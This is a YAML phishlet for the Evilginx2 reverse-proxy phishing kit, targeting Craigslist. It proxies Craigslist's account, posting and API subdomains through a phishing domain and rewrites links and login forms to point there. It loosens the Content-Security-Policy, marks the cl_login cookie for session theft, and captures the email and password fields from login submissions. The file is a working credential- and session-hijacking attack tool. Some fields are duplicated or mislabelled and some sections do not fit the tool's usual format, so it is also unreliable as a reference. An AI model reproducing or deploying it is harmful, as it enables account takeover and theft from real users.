# Craigslist Phishlet for Evilginx2 v3.3.0
name: Craigslist
author: Anon369G
min_ver: "3.0.0"
proxy_hosts:
  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'craigslist.org', session: true, is_landing: true}
  - {phish_sub: 'post', orig_sub: 'post', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'wapi', orig_sub: 'wapi', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'capi', orig_sub: 'capi', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'sapi', orig_sub: 'sapi', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'craigslist.org', session: true, is_landing: true}


sub_filters:
  - domain: 'craigslist.org'
    filters:
      # Rewrite for accounts.craigslist.org
      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.craigslist.org', replace: 'https://accounts.{phish_sub}.{phish_domain}', mimes: ['text/html']}
      - {triggers_on: 'accounts.craigslist.org', search: '/login', replace: 'https://accounts.{phish_sub}.{phish_domain}/login', mimes: ['text/html']}
      - {triggers_on: 'accounts.craigslist.org', search: '/signup', replace: 'https://accounts.{phish_sub}.{phish_domain}/signup', mimes: ['text/html']}
      - {triggers_on: 'accounts.craigslist.org', search: '/reset', replace: 'https://accounts.{phish_sub}.{phish_domain}/reset', mimes: ['text/html']}

      # Rewrite for post.craigslist.org
      - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.craigslist.org', replace: 'https://post.{phish_sub}.{phish_domain}', mimes: ['text/html']}
      - {triggers_on: 'post.craigslist.org', search: '/c/lax', replace: '/c/lax', mimes: ['text/html']}

      # Rewrite for wapi.craigslist.org
      - {triggers_on: 'wapi.craigslist.org', orig_sub: 'wapi', domain: 'craigslist.org', search: 'https://wapi.craigslist.org', replace: 'https://wapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}

      # Rewrite for capi.craigslist.org
      - {triggers_on: 'capi.craigslist.org', orig_sub: 'capi', domain: 'craigslist.org', search: 'https://capi.craigslist.org', replace: 'https://capi.{phish_sub}.{phish_domain}', mimes: ['application/json']}

      # Rewrite for sapi.craigslist.org
      - {triggers_on: 'sapi.craigslist.org', orig_sub: 'sapi', domain: 'craigslist.org', search: 'https://sapi.craigslist.org', replace: 'https://sapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}

      # Rewrite static links
      - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: '/static/www/localStorage', replace: 'https://www.{phish_sub}.{phish_domain}/static/www/localStorage', mimes: ['text/html']}

      # Rewrite help pages
      - {triggers_on: 'www.craigslist.org', search: '/about/help/', replace: '/about/help/', mimes: ['text/html']}
auth_tokens:
  cookies:
    - name: 'cl_b'
      domain: 'craigslist.org'
      is_auth_token: false
    - name: 'cl_def_hp'
      domain: 'craigslist.org'
      is_auth_token: false
    - name: 'cl_login'
      domain: 'accounts.craigslist.org'
      is_auth_token: true
    - name: 'cl_session'
      domain: 'accounts.craigslist.org'
      is_auth_token: false
  headers:
    - name: 'User-Agent'         # Forward the original user-agent
      is_auth_token: false
    - name: 'Accept-Language'    # Forward the accept-language header
      is_auth_token: false
    - name: 'Referer'            # Forward the referer to maintain browsing context
      is_auth_token: false
    - name: 'Sec-Fetch-Site'     # Forward security fetch headers
      is_auth_token: false
    - name: 'Sec-Fetch-Mode'     # Forward fetch mode header
      is_auth_token: false
    - name: 'Sec-Fetch-Dest'     # Forward fetch destination header
      is_auth_token: false
    - name: 'Accept-Encoding'    # Forward the accepted encoding
      is_auth_token: false
    - name: 'Sec-Ch-Ua'          # Foward
      is_auth_token: false

credentials:
  username:
    key: 'inputEmailHandle'
    search: 'post_body'
  password:
    key: 'inputPassword'
    search: 'post_body'

rewrite_rules:
  - type: 'url'
    source: 'https://www.craigslist.org'
    destination: 'https://www.{phish_sub}.{phish_domain}'
  - type: 'url'
    source: 'https://accounts.craigslist.org'
    destination: 'https://accounts.{phish_sub}.{phish_domain}'
  - type: 'url'
    source: 'https://*.craigslist.org'
    destination: 'https://{phish_sub}.{phish_domain}'
  - type: 'header'
    source: 'Content-Security-Policy'
    destination: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
  - type: 'form'
    source: 'https://accounts.craigslist.org/login'
    destination: 'https://accounts.{phish_sub}.{phish_domain}/login'

match_rules:
  domain_match:
    - 'craigslist.org'
    - 'accounts.craigslist.org'
  path_match:
    - '/login'
    - '/post'

session_handling:
  session_lifetime: 3600              # Time in seconds for session expiry
  session_cookie: 'cl_session'        # Session tracking cookie

login:
  domain: 'accounts.craigslist.org'  # The target domain for the login form
  path: '/login'  # Path for login form submission
  method: 'POST'  # HTTP method for form submission
  form:
    fields:
      - { name: 'inputEmailHandle', required: true }    # Username field
      - { name: 'inputEmailHandle', required: true }      # Password field

logging:
  enabled: true                       # Enable logging for phishlet
  level: 'info'                      # Log level (info, debug, warn, error)
